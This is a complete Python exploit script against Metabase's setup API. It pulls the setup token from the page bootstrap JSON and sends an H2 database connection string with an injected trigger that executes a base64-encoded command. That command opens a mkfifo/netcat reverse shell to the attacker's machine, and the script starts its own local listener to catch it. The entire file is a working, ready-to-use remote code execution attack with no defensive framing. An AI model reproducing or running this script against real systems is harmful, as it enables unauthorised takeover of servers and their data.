#!/usr/bin/env python3
import requests
import argparse
from bs4 import BeautifulSoup
import re
import json
import base64
import subprocess
import threading
import time

def setup_listener(port):
	print("[+] Setting up listener...Please Wait..")
	subprocess.run(["nc", "-l", "-n", "-p", str(port)])

def exploitation(setup_token, host, payload, remote_port):
	url = f"http://{host}:{remote_port}/api/setup/validate"
	data = {
		"details":{
			"details":{
				"db": f"zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER ABCD BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x"
			},
			"engine": 'h2',
			"name": "x"
		},
		"token": setup_token
	}

	response = requests.post(url, json=data)
	print("[+] Metabase Machine has been exploited..")
	time.sleep(2)

def get_setup_token(host,remote_port):
	try:
		url = f"http://{host}:{remote_port}/"
		response = requests.get(url)
		soup = BeautifulSoup(response.text, 'html.parser')
		bootstrap_code = soup.find(id="_metabaseBootstrap")
		json_data = json.loads(bootstrap_code.contents[0])
		setup_token = json_data.get('setup-token', None)
		return setup_token
	except Exception as err:
		print(err)
		print("Something went wrong please try again.")

def main():
	## Argument Parse
	parser = argparse.ArgumentParser()
	parser.add_argument("-rh", "--remote-host", type=str, required=True, help="Hostname of the target.")
	parser.add_argument("-rp", "--remote-port", type=int, required=False, help="Port of the Target Machine (default: Port 80)", nargs="?", const="80", default="80")
	parser.add_argument("-p", "--port", type=int, required=True, help="Port for reverse shell.")
	parser.add_argument("-l", "--local-host", type=str, required=True, help="Your IP Adress" )
	args = parser.parse_args()

	## Get the token from the boostrap
	setup_token = get_setup_token(args.remote_host,args.remote_port)
	payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.local_host} {args.port} >/tmp/f"
	encoded_payload  = base64.b64encode(payload.encode('utf-8'))
	shell = encoded_payload.decode().replace("==", " ")

	## Create a thread for listener
	listener_thread = threading.Thread(target=setup_listener, args={args.port})
	listener_thread.start()

	exploitation(setup_token, args.remote_host, shell, args.remote_port)

if __name__ == "__main__":
	main()
